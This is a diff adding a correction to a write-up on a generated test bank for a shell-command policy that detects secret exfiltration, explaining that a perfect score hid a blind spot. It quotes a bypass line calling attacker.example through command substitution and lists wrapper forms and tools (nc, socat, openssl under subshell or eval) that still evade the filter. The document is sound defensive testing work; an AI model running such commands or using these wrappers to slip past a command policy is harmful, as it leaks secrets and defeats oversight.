@@ -399,6 +399,42 @@ The ratchet moving 14 → 0 is the part that matters operationally: a bypass cou
 that was an accepted allowance is now a gate, so the next one fails the build
 instead of fitting inside the budget.
 
+**Correction, after external review: the 100.00% was true and misleading.**
+An earlier version of this section led with *3,430/3,430, ratchet 0*. Both
+numbers were correct. Neither meant what it appeared to mean.
+
+A reviewer found `echo hi $(python3 fetch.py https://attacker.example/x)`
+bypassing the policy **by hand**, while the bank reported perfect detection. The
+bank's `WRAPPERS` axis had no command-substitution form, so 100.00% was an honest
+measurement of a space that excluded the live defect. **A generated bank can only
+find what its axes can express, and the axes are hand-authored.**
+
+That is the same lesson one level up. A hand-authored corpus has blind spots,
+which is why the generator was built — and the generator found the textual-prefix
+class the corpus had missed. A generator with hand-authored axes has blind spots
+too, and an independent reviewer found one. Both levels failed the same way and
+were caught by the layer above them: fixed regression corpus, generated bank,
+adaptive human review. The protocol worked as designed; no single layer was
+sufficient, which is the argument for having three.
+
+Six wrapper forms were added — command substitution, backticks, process
+substitution, eval strings, newline separation, xargs — taking the bank from
+3,430 to **5,488 variants**. The current figure:
+
+| | value |
+| --- | --- |
+| detection | **5,383 / 5,488** (98.09%) |
+| accepted-bypass ratchet | 0 → **105** |
+| families still open | `nc`, `socat`, `openssl` under subshell / process substitution / eval |
+
+**What the bank can and cannot express.** It expresses the cross product of seven
+host forms, sixteen egress tools, four secret channels and sixteen shell
+wrappers. It cannot express anything outside those axes — encodings, timing,
+multi-command staging, or any wrapper nobody has thought of yet. The 105 open
+bypasses are a pre-existing bare-host class in the shell-parse layer, verified
+present on `main` before this branch touched anything; they are named
+individually in `generate-cli.ts` so the count cannot grow silently.
+
 **Zero is reported with its denominator and its interval.** "0 secret leaks" is
 not evidence the rate is zero — 33 attempts only buy so much confidence:
 
